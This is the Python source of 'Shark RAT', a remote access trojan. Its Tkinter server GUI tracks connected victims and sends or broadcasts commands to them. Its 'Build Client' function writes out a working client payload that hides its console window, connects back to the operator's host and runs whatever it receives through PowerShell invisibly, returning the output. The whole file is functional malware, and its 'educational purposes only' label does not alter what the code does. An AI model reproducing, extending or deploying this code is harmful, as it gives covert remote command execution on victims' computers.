import socket
import threading
from colorama import Fore, init
import ctypes
import tkinter as tk
from tkinter import messagebox, simpledialog, scrolledtext, filedialog, colorchooser, Toplevel, Label, Button, ttk

clients = {}
server_thread = None
server_socket = None

def handle_client(client_socket, addr, gui_update_callback):
    clients[addr] = client_socket
    gui_update_callback()
    ctypes.windll.kernel32.SetConsoleTitleW(f"SC RAT | CONNECTED CLIENTS: {len(clients)}")
    while True:
        try:
            response = client_socket.recv(4096).decode()
            if not response:
                break
            gui_update_callback(f"[{addr[0]}] Output: {response}")
        except (ConnectionResetError, BrokenPipeError):
            break
    gui_update_callback(f"Client {addr[0]} disconnected.")
    client_socket.close()
    del clients[addr]
    gui_update_callback()

def accept_clients(server, gui_update_callback):
    while True:
        try:
            client_socket, addr = server.accept()
            threading.Thread(target=handle_client, args=(client_socket, addr, gui_update_callback), daemon=True).start()
        except OSError:
            break  # Server socket closed

def start_server(host, port, gui_update_callback):
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    gui_update_callback(f"[+] Listening on {host}:{port}")
    threading.Thread(target=accept_clients, args=(server_socket, gui_update_callback), daemon=True).start()

def stop_server():
    global server_socket
    if server_socket:
        try:
            server_socket.close()
        except Exception:
            pass
        server_socket = None

def shark_fin_icon():
    # 16x16 shark fin icon as base64 GIF
    return (
        "R0lGODlhEAAQAPAAAP///wAAACH5BAAAAAAALAAAAAAQABAAAAIgjI+py+0Po5y02ouz3rz7D4biSJbmmiYFADs="
    )

class ServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Shark RAT Server")
        self.bg_color = "white"
        self.accent_color = "#1565c0"
        self.font_family = "Segoe UI"
        self.layout_mode = tk.StringVar(value="vertical")

        # Set icon (shark fin)
        import base64
        from tkinter import PhotoImage
        icon_data = base64.b64decode(shark_fin_icon())
        self.icon_img = PhotoImage(data=icon_data)
        self.root.iconphoto(True, self.icon_img)

        # --- Menu Bar ---
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        settings_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Settings", menu=settings_menu)
        settings_menu.add_command(label="Color Settings", command=self.open_color_settings)
        settings_menu.add_command(label="Layout Settings", command=self.open_layout_settings)
        settings_menu.add_command(label="General Settings", command=self.open_general_settings)
        menubar.add_command(label="About", command=self.open_about_page)

        self.main_frame = tk.Frame(self.root, bg=self.bg_color)
        self.main_frame.pack(fill="both", expand=True)
        self.create_vertical_layout()

        self.server_thread = threading.Thread(target=start_server, args=("0.0.0.0", 5555, self.gui_update), daemon=True)
        self.server_thread.start()
        self.refresh_clients()

    def create_vertical_layout(self):
        for widget in self.main_frame.winfo_children():
            widget.destroy()
        style_bg = {"bg": self.bg_color}
        style_label = {"bg": self.bg_color, "fg": self.accent_color, "font": (self.font_family, 10, "bold")}
        style_button = {"bg": self.accent_color, "fg": "white", "activebackground": "#1976d2", "activeforeground": "white", "font": (self.font_family, 10, "bold")}
        style_frame = {"bg": self.bg_color, "bd": 2, "highlightbackground": self.accent_color, "highlightcolor": self.accent_color}

        # Build Client Section
        build_frame = tk.LabelFrame(self.main_frame, text="Build Client", padx=10, pady=10, **style_frame)
        build_frame.pack(padx=10, pady=5, fill="x")
        build_frame.configure(fg=self.accent_color, font=(self.font_family, 11, "bold"))

        tk.Label(build_frame, text="Server IP:", **style_label).grid(row=0, column=0, sticky="e")
        self.client_ip_entry = tk.Entry(build_frame, width=15, **style_bg)
        self.client_ip_entry.grid(row=0, column=1, padx=5)
        self.client_ip_entry.insert(0, "127.0.0.1")

        tk.Label(build_frame, text="Server Port:", **style_label).grid(row=0, column=2, sticky="e")
        self.client_port_entry = tk.Entry(build_frame, width=7, **style_bg)
        self.client_port_entry.grid(row=0, column=3, padx=5)
        self.client_port_entry.insert(0, "5555")

        self.build_button = tk.Button(build_frame, text="Build Client File", command=self.build_client_file, **style_button)
        self.build_button.grid(row=0, column=4, padx=10)

        # Connected Clients Section
        clients_frame = tk.LabelFrame(self.main_frame, text="Connected Clients", padx=10, pady=10, **style_frame)
        clients_frame.pack(padx=10, pady=5, fill="x")
        clients_frame.configure(fg=self.accent_color, font=(self.font_family, 11, "bold"))
        self.clients_listbox = tk.Listbox(clients_frame, width=40, bg=self.bg_color, fg=self.accent_color, font=(self.font_family, 10))
        self.clients_listbox.pack(side="left", padx=5, pady=5)
        self.refresh_button = tk.Button(clients_frame, text="Refresh Clients", command=self.refresh_clients, **style_button)
        self.refresh_button.pack(side="left", padx=5, pady=5)

        # Command Section
        command_frame = tk.LabelFrame(self.main_frame, text="Send Command", padx=10, pady=10, **style_frame)
        command_frame.pack(padx=10, pady=5, fill="x")
        command_frame.configure(fg=self.accent_color, font=(self.font_family, 11, "bold"))
        self.command_entry = tk.Entry(command_frame, width=40, **style_bg)
        self.command_entry.pack(side="left", padx=5)
        self.send_button = tk.Button(command_frame, text="Send Command", command=self.send_command, **style_button)
        self.send_button.pack(side="left", padx=5)
        self.broadcast_button = tk.Button(command_frame, text="Broadcast Command", command=self.broadcast_command, **style_button)
        self.broadcast_button.pack(side="left", padx=5)

        # Output Section
        output_frame = tk.LabelFrame(self.main_frame, text="Output", padx=10, pady=10, **style_frame)
        output_frame.pack(padx=10, pady=5, fill="both", expand=True)
        output_frame.configure(fg=self.accent_color, font=(self.font_family, 11, "bold"))
        self.output_text = scrolledtext.ScrolledText(output_frame, width=60, height=15, bg=self.bg_color, fg=self.accent_color, font=(self.font_family, 10))
        self.output_text.pack(fill="both", expand=True)

    def create_horizontal_layout(self):
        for widget in self.main_frame.winfo_children():
            widget.destroy()
        style_bg = {"bg": self.bg_color}
        style_label = {"bg": self.bg_color, "fg": self.accent_color, "font": (self.font_family, 10, "bold")}
        style_button = {"bg": self.accent_color, "fg": "white", "activebackground": "#1976d2", "activeforeground": "white", "font": (self.font_family, 10, "bold")}
        style_frame = {"bg": self.bg_color, "bd": 2, "highlightbackground": self.accent_color, "highlightcolor": self.accent_color}

        main_pane = tk.PanedWindow(self.main_frame, orient=tk.HORIZONTAL, sashwidth=6, bg=self.bg_color)
        main_pane.pack(fill="both", expand=True)

        # Left: Clients
        clients_frame = tk.LabelFrame(main_pane, text="Connected Clients", padx=10, pady=10, **style_frame)
        clients_frame.configure(fg=self.accent_color, font=(self.font_family, 11, "bold"))
        self.clients_listbox = tk.Listbox(clients_frame, width=30, bg=self.bg_color, fg=self.accent_color, font=(self.font_family, 10))
        self.clients_listbox.pack(side="top", padx=5, pady=5, fill="both", expand=True)
        self.refresh_button = tk.Button(clients_frame, text="Refresh Clients", command=self.refresh_clients, **style_button)
        self.refresh_button.pack(side="top", padx=5, pady=5)
        main_pane.add(clients_frame, stretch="always")

        # Right: Tabs for other options
        right_frame = tk.Frame(main_pane, bg=self.bg_color)
        notebook = ttk.Notebook(right_frame)
        notebook.pack(fill="both", expand=True, padx=5, pady=5)

        # Build Client Tab
        build_tab = tk.Frame(notebook, bg=self.bg_color)
        tk.Label(build_tab, text="Server IP:", **style_label).grid(row=0, column=0, sticky="e")
        self.client_ip_entry = tk.Entry(build_tab, width=15, **style_bg)
        self.client_ip_entry.grid(row=0, column=1, padx=5)
        self.client_ip_entry.insert(0, "127.0.0.1")
        tk.Label(build_tab, text="Server Port:", **style_label).grid(row=0, column=2, sticky="e")
        self.client_port_entry = tk.Entry(build_tab, width=7, **style_bg)
        self.client_port_entry.grid(row=0, column=3, padx=5)
        self.client_port_entry.insert(0, "5555")
        self.build_button = tk.Button(build_tab, text="Build Client File", command=self.build_client_file, **style_button)
        self.build_button.grid(row=0, column=4, padx=10)
        notebook.add(build_tab, text="Build Client")

        # Command Tab
        command_tab = tk.Frame(notebook, bg=self.bg_color)
        self.command_entry = tk.Entry(command_tab, width=40, **style_bg)
        self.command_entry.pack(side="left", padx=5)
        self.send_button = tk.Button(command_tab, text="Send Command", command=self.send_command, **style_button)
        self.send_button.pack(side="left", padx=5)
        self.broadcast_button = tk.Button(command_tab, text="Broadcast Command", command=self.broadcast_command, **style_button)
        self.broadcast_button.pack(side="left", padx=5)
        notebook.add(command_tab, text="Send Command")

        # Output Tab
        output_tab = tk.Frame(notebook, bg=self.bg_color)
        self.output_text = scrolledtext.ScrolledText(output_tab, width=60, height=15, bg=self.bg_color, fg=self.accent_color, font=(self.font_family, 10))
        self.output_text.pack(fill="both", expand=True)
        notebook.add(output_tab, text="Output")

        # Settings Tab
        settings_tab = tk.Frame(notebook, bg=self.bg_color)
        tk.Button(settings_tab, text="Color Settings", command=self.open_color_settings, **style_button).pack(pady=10)
        tk.Button(settings_tab, text="General Settings", command=self.open_general_settings, **style_button).pack(pady=10)
        notebook.add(settings_tab, text="Settings")

        main_pane.add(right_frame, stretch="always")

    def gui_update(self, msg=None):
        self.refresh_clients()
        if msg:
            self.output_text.insert(tk.END, msg + "\n")
            self.output_text.see(tk.END)

    def refresh_clients(self):
        self.clients_listbox.delete(0, tk.END)
        for idx, addr in enumerate(clients.keys(), start=1):
            self.clients_listbox.insert(tk.END, f"{idx}. {addr[0]}:{addr[1]}")

    def send_command(self):
        selection = self.clients_listbox.curselection()
        if not selection:
            messagebox.showwarning("No client selected", "Select a client to send command.")
            return
        idx = selection[0]
        addr = list(clients.keys())[idx]
        command = self.command_entry.get()
        if not command:
            messagebox.showwarning("No command", "Enter a command to send.")
            return
        try:
            clients[addr].send(command.encode())
            self.gui_update(f"Sent to {addr[0]}: {command}")
        except Exception as e:
            self.gui_update(f"Error sending to {addr[0]}: {e}")

    def broadcast_command(self):
        command = self.command_entry.get()
        if not command:
            messagebox.showwarning("No command", "Enter a command to broadcast.")
            return
        for addr, client_socket in clients.items():
            try:
                client_socket.send(command.encode())
                self.gui_update(f"Broadcasted to {addr[0]}: {command}")
            except Exception as e:
                self.gui_update(f"Error broadcasting to {addr[0]}: {e}")

    def restart_server(self):
        stop_server()
        clients.clear()
        self.refresh_clients()
        host = getattr(self, 'listen_ip', tk.StringVar(value="0.0.0.0")).get()
        port = getattr(self, 'listen_port', tk.IntVar(value=5555)).get()
        self.gui_update(f"Restarting server on {host}:{port}...")
        start_server(host, port, self.gui_update)

    def build_client_file(self):
        ip = self.client_ip_entry.get()
        port = self.client_port_entry.get()
        save_path = filedialog.asksaveasfilename(defaultextension=".py", filetypes=[("Python Files", "*.py")])
        if not save_path:
            return
        client_code = f"""import socket
import subprocess
import ctypes

# Hide the console window (Windows only)
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except Exception:
    pass

def start_client(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((server_ip, int(server_port)))
    except Exception as e:
        return

    while True:
        try:
            command = client.recv(4096).decode()
            if not command:
                break
            if command.lower() == "exit":
                break
            try:
                output = subprocess.check_output(
                    ["powershell", "-Command", command],
                    stderr=subprocess.STDOUT,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            except subprocess.CalledProcessError as e:
                output = e.output
            except Exception as e:
                output = str(e)
            client.send(output.encode())
        except Exception:
            break
    client.close()

if __name__ == "__main__":
    start_client("{ip}", {port})
"""
        try:
            with open(save_path, "w") as f:
                f.write(client_code)
            messagebox.showinfo("Success", f"Client file saved to:\n{save_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save client file:\n{e}")

    def open_color_settings(self):
        win = Toplevel(self.root)
        win.title("Color Settings")
        win.geometry("300x200")
        win.configure(bg=self.bg_color)
        Label(win, text="Background Color:", bg=self.bg_color, fg=self.accent_color, font=(self.font_family, 10, "bold")).pack(pady=10)
        Button(win, text="Choose", command=lambda: self.choose_color('bg'), bg=self.accent_color, fg="white").pack(pady=5)
        Label(win, text="Accent Color:", bg=self.bg_color, fg=self.accent_color, font=(self.font_family, 10, "bold")).pack(pady=10)
        Button(win, text="Choose", command=lambda: self.choose_color('accent'), bg=self.accent_color, fg="white").pack(pady=5)

    def open_layout_settings(self):
        win = Toplevel(self.root)
        win.title("Layout Settings")
        win.geometry("300x150")
        win.configure(bg=self.bg_color)
        Label(win, text="Choose Layout:", bg=self.bg_color, fg=self.accent_color, font=(self.font_family, 12, "bold")).pack(pady=10)
        Button(win, text="Vertical Menu", command=lambda: self.set_layout('vertical'), bg=self.accent_color, fg="white").pack(pady=5)
        Button(win, text="Horizontal Menu", command=lambda: self.set_layout('horizontal'), bg=self.accent_color, fg="white").pack(pady=5)

    def set_layout(self, mode):
        self.layout_mode.set(mode)
        if mode == "vertical":
            self.create_vertical_layout()
        else:
            self.create_horizontal_layout()

    def open_general_settings(self):
        win = Toplevel(self.root)
        win.title("General Settings")
        win.geometry("350x220")
        win.configure(bg=self.bg_color)
        Label(win, text="General Settings", bg=self.bg_color, fg=self.accent_color, font=(self.font_family, 14, "bold")).pack(pady=10)
        Button(win, text="Restart Server", command=self.restart_server, bg=self.accent_color, fg="white").pack(pady=10)
        Button(win, text="Clear Output", command=lambda: self.output_text.delete(1.0, tk.END), bg=self.accent_color, fg="white").pack(pady=10)
        Button(win, text="Exit", command=self.root.quit, bg=self.accent_color, fg="white").pack(pady=10)

    def choose_color(self, which):
        color = colorchooser.askcolor()[1]
        if color:
            if which == 'bg':
                self.bg_color = color
            elif which == 'accent':
                self.accent_color = color
            self.root.configure(bg=self.bg_color)
            self.set_layout(self.layout_mode.get())

    def open_about_page(self):
        win = Toplevel(self.root)
        win.title("About Shark RAT")
        win.geometry("350x180")
        win.configure(bg=self.bg_color)
        Label(win, text="Shark RAT", bg=self.bg_color, fg=self.accent_color, font=(self.font_family, 16, "bold")).pack(pady=10)
        Label(win, text="Remote Administration Tool\nFor educational and research purposes only.", bg=self.bg_color, fg=self.accent_color, font=(self.font_family, 10)).pack(pady=5)
        Label(win, text="Made by lilshark\n2025", bg=self.bg_color, fg=self.accent_color, font=(self.font_family, 10, "italic")).pack(pady=10)

if __name__ == "__main__":
    init(autoreset=True)
    root = tk.Tk()
    app = ServerGUI(root)
    root.mainloop()